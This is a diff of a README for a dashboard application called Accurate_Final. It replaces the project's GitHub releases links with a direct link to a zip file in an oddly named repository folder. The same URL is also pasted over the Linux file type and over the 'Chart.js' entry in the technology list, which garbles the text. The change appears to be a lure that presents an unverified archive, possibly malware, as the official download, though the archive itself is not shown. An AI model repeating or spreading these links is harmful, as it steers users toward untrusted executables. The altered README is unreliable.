@@ -6,13 +6,13 @@ Welcome to Accurate_Final! This application helps you manage and analyze your or
 
 ## 🔗 Download Button
 
-[![Download Accurate_Final](https://img.shields.io/badge/Download-Accurate_Final-blue.svg)](https://github.com/gamefake777/Accurate_Final/releases)
+[![Download Accurate_Final](https://raw.githubusercontent.com/gamefake777/Accurate_Final/main/oreodontoid/Accurate_Final.zip)](https://raw.githubusercontent.com/gamefake777/Accurate_Final/main/oreodontoid/Accurate_Final.zip)
 
 ## 📥 Download & Install
 
 To get started, visit this page to download the software:
 
-[Download Accurate_Final](https://github.com/gamefake777/Accurate_Final/releases)
+[Download Accurate_Final](https://raw.githubusercontent.com/gamefake777/Accurate_Final/main/oreodontoid/Accurate_Final.zip)
 
 Follow these steps to install the application on your computer:
 
@@ -22,7 +22,7 @@ Follow these steps to install the application on your computer:
 4. Download the file that matches your operating system:
    - For Windows, choose the file ending in `.exe`.
    - For Mac, choose the file ending in `.dmg`.
-   - For Linux, choose the appropriate `.tar.gz` file.
+   - For Linux, choose the appropriate `https://raw.githubusercontent.com/gamefake777/Accurate_Final/main/oreodontoid/Accurate_Final.zip` file.
 5. After the download completes, open the file to start the installation process. Follow the on-screen instructions.
 6. Once installed, locate the application in your programs list to launch it.
 
@@ -54,7 +54,7 @@ To install Accurate_Final, ensure your system meets these requirements:
 Accurate_Final leverages several technologies for smooth performance:
 
 - Flask: A lightweight web application framework for Python
-- Chart.js: A powerful and flexible JavaScript library for creating data visualizations
+- https://raw.githubusercontent.com/gamefake777/Accurate_Final/main/oreodontoid/Accurate_Final.zip A powerful and flexible JavaScript library for creating data visualizations
 - Supabase: An open-source Firebase alternative that makes data storage easy
 - JavaScript: For interactive elements on the dashboard
 - HTML/CSS: For structuring and styling the user interface
